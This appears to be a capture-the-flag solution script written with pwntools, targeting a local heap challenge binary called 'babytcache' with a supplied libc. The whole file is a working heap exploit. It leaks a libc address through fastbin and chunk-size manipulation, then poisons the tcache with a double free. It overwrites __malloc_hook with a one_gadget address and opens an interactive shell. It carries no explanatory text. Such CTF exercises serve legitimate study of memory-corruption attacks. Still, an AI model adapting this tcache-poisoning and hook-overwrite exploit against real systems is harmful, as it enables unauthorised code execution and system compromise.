from pwn import *

context.log_level='debug'
p=process("./babytcache",env={"LD_PRELOAD":"./libc3.so"})
def add(note):
   p.sendlineafter(">>","1")
   p.sendafter(":",note)

def delete(index):
   p.sendlineafter(">>","2")
   p.sendlineafter(":",str(index))

for i in range(24):
   add("kirin\n")
for i in range(7):
   delete(i+1)

#fastbin
delete(0)
delete(7)
add("kirin\n")
add(p64(0x30)+p64(0x451)+"\n")
delete(0)
p.sendlineafter(">>","3")
p.sendlineafter(":","0")
addr=u64(p.recv(6)+"\x00\x00")-0x3ebca0
one_gadget=addr+0x10a38c
malloc_hook=addr+0x3ebc30
delete(5)
delete(5)
add(p64(malloc_hook)+"\n")
add("aaa\n")
add(p64(one_gadget)+"\n")
print hex(addr)

p.interactive()
